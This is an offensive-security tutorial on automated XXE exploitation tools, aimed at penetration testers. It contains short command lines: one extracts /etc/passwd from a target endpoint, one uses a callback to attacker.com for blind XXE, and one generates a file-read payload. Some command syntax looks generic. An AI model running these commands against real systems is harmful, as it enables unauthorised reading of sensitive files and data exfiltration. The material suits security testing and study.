# Automated XXE Tools

## Context

This article aims to enable offensive operators to efficiently leverage automated tools for XXE (XML External Entity) exploitation. Readers are expected to understand XML structure and parsing, entity declaration, DTD processing, manual XXE attack methodologies, and techniques for detecting XXE vulnerabilities.

## Theory

### Purpose and Scope of Automated XXE Tools

Automated XXE tools are designed to streamline the process of identifying and exploiting XML External Entity vulnerabilities. These tools enhance coverage, speed, and consistency in executing XXE attacks. A typical workflow with these tools includes payload generation, injection, response analysis, and reporting.

### Categories of Automated XXE Tools

Automated XXE tools can be categorized into payload generators, fuzzers, exploitation frameworks, and proxy plugins. The selection of a tool depends on the target environment, the goals of the attack, and the specific integration needs of the operator.

### Automation Logic and Output Interpretation

These tools work by injecting crafted XML into the target, monitoring responses, and flagging potential indicators of XXE. They often include payload variants to evade input filters and Web Application Firewalls (WAFs). Automated tools may also chain multiple payloads for effective blind XXE detection.

## Practice

### Automated XXE Exploitation with XXEinjector

- **Step 1:** Launch the XXEinjector tool targeting a vulnerable endpoint with a specified XML data and file exfiltration payload.
  
  ```bash
  xxeinjector --url http://target/vuln_endpoint --data '<xml>...</xml>' --file /etc/passwd
  ```

- **Outcome:** XXEinjector will display extracted file contents or error messages, resulting in automated retrieval of sensitive files.

### Blind XXE Automation with Blind XXE Toolkit

- **Step 1:** Use the Blind XXE Toolkit to configure an out-of-band XXE detection via an attacker-controlled callback URL.
  
  ```bash
  blind-xxe --url http://target/vuln_endpoint --callback http://attacker.com/callback
  ```

- **Outcome:** The toolkit logs incoming DNS/HTTP requests, confirming blind XXE through external interaction with attacker infrastructure.

### Automated Payload Generation with XXE Payload Generator

- **Step 1:** Generate an XXE payload for file disclosure using the payload generator.
  
  ```bash
  xxe-payload-generator --type file_read --file /etc/hosts
  ```

- **Outcome:** The tool creates a valid XML payload for injection, enabling rapid payload development.

### Proxy-based XXE Automation with Burp XXE Plugin

- **Step 1:** Configure Burp Suite with the XXE plugin to intercept and manipulate target XML requests.
  
  - **Configure Plugin:** Activate the XXE plugin within Burp Suite.
  - **Select Payloads:** Choose appropriate payloads for automated scanning.

- **Outcome:** The plugin highlights vulnerable requests, exploiting XXE vulnerabilities and displaying extracted data.
